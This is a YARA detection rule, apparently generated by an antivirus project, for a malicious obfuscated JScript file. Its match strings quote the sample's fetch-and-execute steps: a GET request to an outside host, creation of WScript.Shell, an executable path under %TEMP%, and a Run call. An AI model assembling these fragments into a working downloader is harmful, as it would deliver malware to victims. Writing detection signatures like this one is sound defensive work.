rule sig_20160330_b3b36139d655f463023c1d77ad488d07 {
  meta:
    description = "datamaliciousorder - file 20160330_b3b36139d655f463023c1d77ad488d07.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c4ba8111b9f1d692ece860115eb5e0df3972e400c1ba3bc8ca17de21d11b9b0c"

  strings:
    $s1  = "_BH[_FK](\"GET\", \"http://rocketsrange.com/b5ksa\", false);" fullword ascii
    $s2  = "var _X0 = function _N() {return WScript[_N0](\"WScript\"+\".Shell\");}(), _C = 11;" fullword ascii
    $s3  = "function _G(_RN, _GJ){_V = _V * 1; return _RN - _GJ;};" fullword ascii
    $s4  = "if (_BH[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _IJ() {return _X0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"w9iGqzLT4a7cM.ex\" + \"e\";};" fullword ascii
    $s6  = "function _D(){return _KX + \"\";};" fullword ascii
    $s7  = "function _PI() {return ((_ND == true) && (_ND == _JL)) ? 1 : _V;};" fullword ascii
    $s8  = "function _NR(_H){_X0[\"Run\"](_H, _V, _V);};" fullword ascii
    $s9  = "function _Z(){return 22;};" fullword ascii
    $s10 = "function _NX()" fullword ascii
    $s11 = "var _TB = new this[\"Date\"]();" fullword ascii
    $s12 = "function _R(){return _N0;};" fullword ascii
    $s13 = "return _G(_J, _CP);" fullword ascii
    $s14 = " while (_JX){" fullword ascii
    $s15 = "function _M(_QE) {var _LG = (1, 2, 3, 4, 5, _QE); return _LG;};" fullword ascii
    $s16 = "var _X = false;" fullword ascii
    $s17 = "var _JL = false;" fullword ascii
    $s18 = "_JL = true; " fullword ascii
    $s19 = "_ND = true; " fullword ascii
    $s20 = "var _ND = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}